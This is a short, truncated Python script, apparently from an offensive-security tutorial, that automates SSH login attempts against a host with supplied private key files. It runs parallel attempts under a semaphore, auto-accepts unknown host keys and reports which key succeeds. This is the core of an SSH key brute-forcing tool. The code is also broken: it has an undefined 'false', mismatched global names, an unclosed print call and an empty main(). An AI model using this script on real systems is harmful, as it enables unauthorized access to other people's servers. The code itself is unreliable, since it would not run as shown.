#! /usr/bin/python

import socket
import os, sys, getopt
import pexpect
from threading import *

maxConnections = 5;
connection_lock = BoundSemaphore(value=maxConnections);
Stop = false;
Fails = 0;

def connect(user, host, keyfile, release):
	global Stop;
	global Fail;
	try:
		perm_denied = 'Permission denied';
		ssh_newkey = 'Are you sure you want to continue';
		conn_closed = 'Connection closed by remote host';
		opt = ' -o PasswordAuthentication=no';
		connStr = 'ssh ' + user + '@' + host + ' -i ' + keyfile + opt;
	
		child = pexpect.spawn(connStr);
		ret =  child.expect([pexpect.TIMEOUT, perm_denied, ssh_newkey, conn_closed, '$', '#', ]);
		
		if ret == 2:
			print ('[-] Adding Host to ~/.ssh/known_hosts');
			child.sendline('yes');
			connect(user, host, keyfile, False);
		elif ret == 3:
			print ('[-] Connection Closed by remote host');
			Fails +=1;
		elif ret > 3:
			print ('[+] Success.' + str(keyfile)
			Stop = True;
	finally:
		if release:
			connection_lock.release();

def main():

